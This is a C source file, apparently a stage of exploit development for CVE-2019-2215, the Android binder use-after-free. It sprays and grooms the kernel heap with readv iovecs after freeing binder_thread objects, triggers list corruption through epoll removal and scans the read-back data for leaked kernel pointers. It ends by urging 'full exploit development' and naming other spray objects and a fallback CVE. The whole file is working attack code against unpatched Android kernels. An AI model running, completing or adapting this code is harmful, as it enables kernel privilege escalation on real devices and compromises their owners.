/*
 * binder_uaf_spray.c - CVE-2019-2215 with aggressive heap spray
 *
 * The definitive test proved the single-free approach never reclaims
 * the slot (50/50 full data). This version:
 *
 * 1. Opens MULTIPLE binder fds, each with its own epoll
 * 2. Frees ALL binder_threads at once (flooding the kmalloc-512 freelist)
 * 3. readv's iovec kmalloc should land in one of the freed slots
 * 4. EPOLL_CTL_DEL on all fds triggers list_del on freed memory
 *
 * Also tries different slab sizes in case binder_thread isn't kmalloc-512.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_uaf_spray binder_uaf_spray.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/wait.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

static void force_binder_thread(int fd)
{
    struct binder_write_read bwr;
    char buf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(buf);
    bwr.read_buffer = (unsigned long)buf;
    ioctl(fd, BINDER_WRITE_READ, &bwr);
}

static int pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

#define MAX_BINDERS     50
#define MAX_ATTEMPTS    20

/*
 * Test with N freed binder_threads and specific iovec count.
 * Returns: 1=corruption detected, 0=no corruption, -1=error
 */
static int test_spray(int num_binders, int num_iov, int per_iov, int cpu, int attempt)
{
    int binder_fds[MAX_BINDERS];
    int epfds[MAX_BINDERS];
    struct epoll_event event = { .events = EPOLLIN };
    int pipefd[2];
    int ret = 0;

    pin_to_cpu(cpu);

    int total_data = num_iov * per_iov;

    /* Open N binder fds, each with a thread + epoll */
    int opened = 0;
    for (int i = 0; i < num_binders; i++) {
        binder_fds[i] = open("/dev/binder", O_RDONLY);
        if (binder_fds[i] < 0) break;

        force_binder_thread(binder_fds[i]);

        epfds[i] = epoll_create(1);
        if (epfds[i] < 0) { close(binder_fds[i]); break; }

        if (epoll_ctl(epfds[i], EPOLL_CTL_ADD, binder_fds[i], &event) < 0) {
            close(epfds[i]); close(binder_fds[i]); break;
        }
        opened++;
    }

    if (opened < num_binders) {
        printf("    [!] Only opened %d/%d binders\n", opened, num_binders);
        if (opened < 2) {
            for (int i = 0; i < opened; i++) {
                close(epfds[i]); close(binder_fds[i]);
            }
            return -1;
        }
    }

    if (pipe(pipefd) < 0) {
        for (int i = 0; i < opened; i++) {
            close(epfds[i]); close(binder_fds[i]);
        }
        return -1;
    }

    /* Setup iovecs */
    struct iovec *iov = calloc(num_iov, sizeof(struct iovec));
    char **bufs = calloc(num_iov, sizeof(char *));
    for (int i = 0; i < num_iov; i++) {
        bufs[i] = calloc(1, per_iov);
        memset(bufs[i], 0x41 + (i % 26), per_iov);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = per_iov;
    }

    pid_t pid = fork();
    if (pid < 0) {
        for (int i = 0; i < num_iov; i++) free(bufs[i]);
        free(bufs); free(iov);
        close(pipefd[0]); close(pipefd[1]);
        for (int i = 0; i < opened; i++) {
            close(epfds[i]); close(binder_fds[i]);
        }
        return -1;
    }

    if (pid == 0) {
        /* CHILD */
        close(pipefd[0]);
        pin_to_cpu(cpu);

        /* Wait for parent to free all threads and enter readv */
        usleep(200000); /* 200ms - extra time for bulk free */

        /* Trigger list_del on ALL freed binder_thread wait queues.
         * One of these list_del operations should corrupt our iovec. */
        for (int i = 0; i < opened; i++) {
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, binder_fds[i], &event);
        }

        /* Let list_del complete */
        usleep(10000); /* 10ms */

        /* Single write of all data */
        char *data = malloc(total_data);
        memset(data, 'Z', total_data);
        write(pipefd[1], data, total_data);
        free(data);

        close(pipefd[1]);
        _exit(0);
    }

    /* PARENT */
    close(pipefd[1]);

    /* Free ALL binder_threads - flooding kmalloc freelist */
    for (int i = 0; i < opened; i++) {
        ioctl(binder_fds[i], BINDER_THREAD_EXIT, NULL);
    }

    /* readv: iovec kmalloc should land in one of the freed slots */
    ssize_t bytes = readv(pipefd[0], iov, num_iov);
    int saved_errno = errno;

    waitpid(pid, NULL, 0);
    close(pipefd[0]);

    /* Print result */
    if (bytes < 0 && saved_errno == EFAULT) {
        printf("    [+] EFAULT! UAF CONFIRMED! (attempt %d, %d binders, cpu %d)\n",
               attempt, opened, cpu);
        ret = 1;
    } else if (bytes > 0 && bytes < total_data) {
        int completed = (int)(bytes / per_iov);
        printf("    [+] Partial %zd/%d (iov[%d]) attempt %d cpu %d",
               bytes, total_data, completed, attempt, cpu);

        /* Check for kernel pointers in the partial data */
        int found_kptr = 0;
        for (int i = 0; i < num_iov; i++) {
            int start = i * per_iov;
            if (start >= bytes) break;
            int filled = ((start + per_iov) <= bytes) ? per_iov : (int)(bytes - start);

            uint64_t *p = (uint64_t *)bufs[i];
            for (int j = 0; j < filled / 8; j++) {
                if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("\n    *** KERNEL PTR in iov[%d]+%d: 0x%016lx ***",
                           i, j * 8, p[j]);
                    found_kptr = 1;
                }
            }
        }
        printf("\n");

        if (found_kptr || completed <= 6) {
            ret = 1; /* Strong evidence of UAF */
        }
    } else if (bytes == total_data) {
        /* Full data - check for anomalies */
        for (int i = 0; i < num_iov; i++) {
            uint64_t *p = (uint64_t *)bufs[i];
            for (int j = 0; j < per_iov / 8; j++) {
                if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("    [!] KERNEL PTR in iov[%d]+%d: 0x%016lx (full read!)\n",
                           i, j * 8, p[j]);
                    ret = 1;
                }
            }
        }
    }

    /* Cleanup */
    for (int i = 0; i < opened; i++) {
        close(epfds[i]);
        close(binder_fds[i]);
    }
    for (int i = 0; i < num_iov; i++) free(bufs[i]);
    free(bufs);
    free(iov);

    return ret;
}

/*
 * Test with pre-spray: fill kmalloc cache then free specific objects
 * to groom the heap for more reliable reclaim.
 */
static int test_with_grooming(int num_iov, int per_iov, int cpu, int attempt)
{
    int groom_fds[100];
    int groom_count = 0;
    struct epoll_event event = { .events = EPOLLIN };
    int pipefd[2];
    int total_data = num_iov * per_iov;

    pin_to_cpu(cpu);

    /* Phase 1: Groom - fill up kmalloc cache with binder_threads */
    for (int i = 0; i < 100; i++) {
        groom_fds[i] = open("/dev/binder", O_RDONLY);
        if (groom_fds[i] < 0) break;
        force_binder_thread(groom_fds[i]);
        groom_count++;
    }

    if (groom_count < 10) {
        printf("    [!] Only groomed %d binders\n", groom_count);
        for (int i = 0; i < groom_count; i++) close(groom_fds[i]);
        return -1;
    }

    /* Phase 2: Free the LAST few threads - they're likely adjacent in the slab */
    /* Keep first ones alive to ensure the slab page isn't freed */
    int target_fd = groom_fds[groom_count - 1];
    int target_epfd = epoll_create(1);
    epoll_ctl(target_epfd, EPOLL_CTL_ADD, target_fd, &event);

    /* Free last 10 threads to create holes */
    for (int i = groom_count - 10; i < groom_count; i++) {
        ioctl(groom_fds[i], BINDER_THREAD_EXIT, NULL);
    }

    if (pipe(pipefd) < 0) {
        close(target_epfd);
        for (int i = 0; i < groom_count; i++) close(groom_fds[i]);
        return -1;
    }

    struct iovec *iov = calloc(num_iov, sizeof(struct iovec));
    char **bufs = calloc(num_iov, sizeof(char *));
    for (int i = 0; i < num_iov; i++) {
        bufs[i] = calloc(1, per_iov);
        memset(bufs[i], 0x41 + (i % 26), per_iov);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = per_iov;
    }

    pid_t pid = fork();
    if (pid < 0) {
        for (int i = 0; i < num_iov; i++) free(bufs[i]);
        free(bufs); free(iov);
        close(pipefd[0]); close(pipefd[1]);
        close(target_epfd);
        for (int i = 0; i < groom_count; i++) close(groom_fds[i]);
        return -1;
    }

    if (pid == 0) {
        close(pipefd[0]);
        pin_to_cpu(cpu);
        usleep(100000);

        /* Trigger list_del on the target */
        epoll_ctl(target_epfd, EPOLL_CTL_DEL, target_fd, &event);

        usleep(10000);
        char *data = malloc(total_data);
        memset(data, 'Z', total_data);
        write(pipefd[1], data, total_data);
        free(data);
        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);

    /* readv - should land in one of the 10 freed slots */
    ssize_t bytes = readv(pipefd[0], iov, num_iov);
    int saved_errno = errno;

    waitpid(pid, NULL, 0);
    close(pipefd[0]);

    int ret = 0;
    if (bytes < 0 && saved_errno == EFAULT) {
        printf("    [+] GROOMED EFAULT! (attempt %d)\n", attempt);
        ret = 1;
    } else if (bytes > 0 && bytes < total_data) {
        int completed = (int)(bytes / per_iov);
        printf("    [+] GROOMED partial %zd/%d iov[%d] (attempt %d)\n",
               bytes, total_data, completed, attempt);
        if (completed <= 6) ret = 1;
    } else if (bytes == total_data) {
        /* Check for kernel pointers */
        for (int i = 0; i < num_iov; i++) {
            uint64_t *p = (uint64_t *)bufs[i];
            for (int j = 0; j < per_iov / 8; j++) {
                if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("    [!] GROOMED kernel ptr iov[%d]+%d: 0x%016lx\n",
                           i, j * 8, p[j]);
                    ret = 1;
                }
            }
        }
    }

    close(target_epfd);
    for (int i = 0; i < groom_count; i++) close(groom_fds[i]);
    for (int i = 0; i < num_iov; i++) free(bufs[i]);
    free(bufs); free(iov);

    return ret;
}

int main(void)
{
    printf("=== CVE-2019-2215 Aggressive Spray Test ===\n");
    printf("uid=%d pid=%d\n", getuid(), getpid());

    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) { printf("[-] /dev/binder: %s\n", strerror(errno)); return 1; }
    close(fd);

    /* ===== Test 1: Multi-free spray (different binder counts) ===== */
    printf("\n--- Test 1: Multi-free spray (kmalloc-512, 19 iovecs) ---\n");

    struct { int binders; const char *label; } spray_configs[] = {
        { 5,  "5 binders" },
        { 10, "10 binders" },
        { 20, "20 binders" },
        { 40, "40 binders" },
    };

    int detected = 0;
    for (int c = 0; c < 4 && !detected; c++) {
        printf("  %s:\n", spray_configs[c].label);
        for (int i = 0; i < MAX_ATTEMPTS && !detected; i++) {
            int cpu = i % 6;
            int r = test_spray(spray_configs[c].binders, 19, 64, cpu, i);
            if (r == 1) {
                detected = 1;
                printf("  >>> DETECTED with %s!\n", spray_configs[c].label);
            }
            if (r == -1 && i == 0) {
                printf("  >>> Skipping (can't open enough binders)\n");
                break;
            }
        }
        if (!detected) printf("  Not detected after %d attempts\n", MAX_ATTEMPTS);
    }

    /* ===== Test 2: Different slab sizes ===== */
    if (!detected) {
        printf("\n--- Test 2: Probing different slab sizes ---\n");
        printf("  Maybe binder_thread isn't in kmalloc-512?\n");

        struct { int num_iov; int per_iov; int alloc_sz; const char *slab; } slab_configs[] = {
            { 9,  16, 144,  "kmalloc-256 (144B)" },
            { 12, 16, 192,  "kmalloc-256 (192B)" },
            { 16, 16, 256,  "kmalloc-256 (256B)" },
            { 17, 16, 272,  "kmalloc-512 (272B)" },
            { 19, 16, 304,  "kmalloc-512 (304B)" },
            { 32, 16, 512,  "kmalloc-512 (512B)" },
            { 33, 16, 528,  "kmalloc-1024 (528B)" },
            { 64, 16, 1024, "kmalloc-1024 (1024B)" },
        };

        for (int c = 0; c < 8 && !detected; c++) {
            printf("  %s (%d iovecs x %dB):\n",
                   slab_configs[c].slab,
                   slab_configs[c].num_iov,
                   slab_configs[c].per_iov);
            for (int i = 0; i < 10 && !detected; i++) {
                int r = test_spray(20, slab_configs[c].num_iov,
                                   slab_configs[c].per_iov, i % 6, i);
                if (r == 1) {
                    detected = 1;
                    printf("  >>> DETECTED with %s!\n", slab_configs[c].slab);
                }
            }
        }
    }

    /* ===== Test 3: Heap grooming ===== */
    if (!detected) {
        printf("\n--- Test 3: Heap grooming (100 binders, free last 10) ---\n");
        for (int i = 0; i < MAX_ATTEMPTS && !detected; i++) {
            int r = test_with_grooming(19, 64, i % 6, i);
            if (r == 1) {
                detected = 1;
                printf("  >>> DETECTED with grooming!\n");
            }
        }
        if (!detected) printf("  Not detected after %d attempts\n", MAX_ATTEMPTS);
    }

    /* ===== Test 4: Verify binder_thread is actually freed ===== */
    if (!detected) {
        printf("\n--- Test 4: Verify BINDER_THREAD_EXIT actually frees ---\n");

        /* Open binder, create thread, exit thread, try to create again */
        int bfd = open("/dev/binder", O_RDONLY);
        force_binder_thread(bfd);
        int r1 = ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  First BINDER_THREAD_EXIT: %s (ret=%d)\n",
               r1 == 0 ? "OK" : "FAIL", r1);

        /* Try to exit again - should fail (no thread) or create+free */
        force_binder_thread(bfd);
        int r2 = ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  Second BINDER_THREAD_EXIT: %s (ret=%d)\n",
               r2 == 0 ? "OK" : "FAIL", r2);

        /* How many binder fds can we open? */
        int count = 0;
        int fds[256];
        for (int i = 0; i < 256; i++) {
            fds[i] = open("/dev/binder", O_RDONLY);
            if (fds[i] < 0) break;
            count++;
        }
        printf("  Can open %d binder fds simultaneously\n", count);
        for (int i = 0; i < count; i++) close(fds[i]);
        close(bfd);
    }

    /* ===== Summary ===== */
    printf("\n=== RESULT ===\n");
    if (detected) {
        printf("[+] CVE-2019-2215 UAF CONFIRMED!\n");
        printf("[+] The iovec spray successfully reclaimed a freed binder_thread.\n");
        printf("[+] Proceed to full exploit development.\n");
    } else {
        printf("[-] UAF not detected with any spray configuration.\n");
        printf("[-] Possible explanations:\n");
        printf("    1. SLUB freelist isolation (BB security patch)\n");
        printf("    2. binder_thread allocated from a dedicated cache\n");
        printf("    3. Intervening allocations consuming all freed slots\n");
        printf("    4. list_del not actually corrupting (CONFIG_DEBUG_LIST?)\n");
        printf("    5. epoll wait queue entry removed during BINDER_THREAD_EXIT\n");
        printf("[-] Consider:\n");
        printf("    - Trying alternative spray objects (msg_msg, key payload)\n");
        printf("    - Using recvmsg/sendmsg instead of readv\n");
        printf("    - Pivoting to CVE-2018-9568 (WrongZone)\n");
    }

    printf("\n=== DONE ===\n");
    return detected ? 0 : 2;
}
